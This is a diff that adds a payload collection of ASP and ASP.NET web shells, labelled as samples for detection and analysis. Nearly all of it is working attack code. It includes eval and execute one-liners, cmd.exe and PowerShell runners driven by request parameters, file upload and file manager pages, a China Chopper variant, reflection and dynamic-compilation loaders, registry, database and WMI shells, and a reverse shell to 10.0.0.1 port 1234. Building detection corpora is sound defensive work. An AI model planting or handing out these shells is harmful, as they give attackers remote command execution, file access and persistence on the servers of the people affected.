@@ -1,0 +1,263 @@
+# ASP/ASPX Web Shells
+# ASP and ASP.NET web shell samples for detection and analysis
+
+# Basic ASP Shell
+<%eval request("cmd")%>
+<%execute request("cmd")%>
+<%response.write(eval(request("cmd")))%>
+
+# ASP Command Execution
+<%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+szCMD = Request.Form("cmd")
+If (szCMD <> "") Then
+    Set oExec = oScript.Exec(szCMD)
+    Response.Write(oExec.StdOut.ReadAll)
+End If
+%>
+
+# ASP.NET Basic Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + Request["cmd"];
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+}
+</script>
+
+# ASPX Eval Shell
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    eval(Request["cmd"]);
+}
+</script>
+
+# ASPX One-liner
+<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>
+
+# ASP File Upload
+<%
+If Request.Form("upload") <> "" Then
+    Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(Request.Form("filename"))
+    objFile.Write Request.Form("content")
+    objFile.Close
+End If
+%>
+
+# ASPX File Upload
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    if(Request.Files.Count > 0){
+        Request.Files[0].SaveAs(Server.MapPath(Request.Files[0].FileName));
+    }
+}
+</script>
+
+# ASP.NET Reverse Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    TcpClient client = new TcpClient("10.0.0.1", 1234);
+    Stream stream = client.GetStream();
+    StreamReader reader = new StreamReader(stream);
+    StreamWriter writer = new StreamWriter(stream);
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.RedirectStandardInput = true;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.UseShellExecute = false;
+    p.Start();
+    writer.AutoFlush = true;
+    while(true){
+        writer.Write(p.StandardOutput.ReadToEnd());
+        p.StandardInput.WriteLine(reader.ReadLine());
+    }
+}
+</script>
+
+# ASP.NET Web Shell with Authentication
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    if(Request["pass"] == "password"){
+        System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]);
+    }
+}
+</script>
+
+# ASPX China Chopper
+<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
+
+# ASPX Antak Shell (simplified)
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    string cmd = Request.Form["cmd"];
+    if(!string.IsNullOrEmpty(cmd)){
+        ProcessStartInfo psi = new ProcessStartInfo();
+        psi.FileName = "powershell.exe";
+        psi.Arguments = "-Command " + cmd;
+        psi.RedirectStandardOutput = true;
+        psi.UseShellExecute = false;
+        Process p = Process.Start(psi);
+        Response.Write(p.StandardOutput.ReadToEnd());
+    }
+}
+</script>
+
+# ASPX Obfuscated Shell
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    string a = "System.Diagnostics.Process";
+    Type t = Type.GetType(a);
+    object o = Activator.CreateInstance(t);
+    t.GetMethod("Start", new Type[]{typeof(string)}).Invoke(o, new object[]{Request["cmd"]});
+}
+</script>
+
+# ASP.NET Reflection Shell
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    System.Reflection.Assembly.Load(Convert.FromBase64String(Request["asm"])).GetType(Request["type"]).GetMethod(Request["method"]).Invoke(null, new object[]{Request["args"]});
+}
+</script>
+
+# ASPX Base64 Encoded Shell
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    byte[] data = Convert.FromBase64String(Request["cmd"]);
+    string cmd = System.Text.Encoding.UTF8.GetString(data);
+    System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
+}
+</script>
+
+# ASP.NET Dynamic Compilation
+<%@ Page Language="C#" %>
+<%@ Import Namespace="Microsoft.CSharp" %>
+<%@ Import Namespace="System.CodeDom.Compiler" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    CSharpCodeProvider provider = new CSharpCodeProvider();
+    CompilerParameters parameters = new CompilerParameters();
+    parameters.GenerateInMemory = true;
+    CompilerResults results = provider.CompileAssemblyFromSource(parameters, Request["code"]);
+    results.CompiledAssembly.GetType("Shell").GetMethod("Execute").Invoke(null, null);
+}
+</script>
+
+# ASPX PowerShell Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Management.Automation" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    PowerShell ps = PowerShell.Create();
+    ps.AddScript(Request["ps"]);
+    var results = ps.Invoke();
+    foreach(var result in results){
+        Response.Write(result.ToString());
+    }
+}
+</script>
+
+# ASP.NET File Manager
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    if(!string.IsNullOrEmpty(Request["dir"])){
+        string[] files = Directory.GetFiles(Request["dir"]);
+        foreach(string file in files){
+            Response.Write(file + "<br>");
+        }
+    }
+    if(!string.IsNullOrEmpty(Request["read"])){
+        Response.Write(File.ReadAllText(Request["read"]));
+    }
+    if(!string.IsNullOrEmpty(Request["write"])){
+        File.WriteAllText(Request["file"], Request["content"]);
+    }
+}
+</script>
+
+# ASP.NET Database Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Data.SqlClient" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    SqlConnection conn = new SqlConnection("Server=localhost;Database=master;Integrated Security=true;");
+    SqlCommand cmd = new SqlCommand(Request["query"], conn);
+    conn.Open();
+    SqlDataReader reader = cmd.ExecuteReader();
+    while(reader.Read()){
+        Response.Write(reader[0].ToString());
+    }
+    conn.Close();
+}
+</script>
+
+# ASPX WMI Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Management" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    ManagementClass mc = new ManagementClass("Win32_Process");
+    ManagementBaseObject inParams = mc.GetMethodParameters("Create");
+    inParams["CommandLine"] = Request["cmd"];
+    ManagementBaseObject outParams = mc.InvokeMethod("Create", inParams, null);
+}
+</script>
+
+# ASPX Registry Shell
+<%@ Page Language="C#" %>
+<%@ Import Namespace="Microsoft.Win32" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    RegistryKey key = Registry.LocalMachine.OpenSubKey(Request["key"]);
+    Response.Write(key.GetValue(Request["value"]));
+}
+</script>
+
+# ASP Classic File Manager
+<%
+Set fso = Server.CreateObject("Scripting.FileSystemObject")
+If Request.QueryString("dir") <> "" Then
+    Set folder = fso.GetFolder(Request.QueryString("dir"))
+    For Each file In folder.Files
+        Response.Write file.Name & "<br>"
+    Next
+End If
+If Request.Form("read") <> "" Then
+    Set file = fso.OpenTextFile(Request.Form("read"))
+    Response.Write file.ReadAll
+    file.Close
+End If
+%>
+
+# ASPX Encoded Command
+<%@ Page Language="C#" %>
+<script runat="server">
+void Page_Load(object sender, EventArgs e){
+    string encoded = Request["enc"];
+    byte[] data = Convert.FromBase64String(encoded);
+    string cmd = System.Text.Encoding.UTF8.GetString(data);
+    System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
+}
+</script>
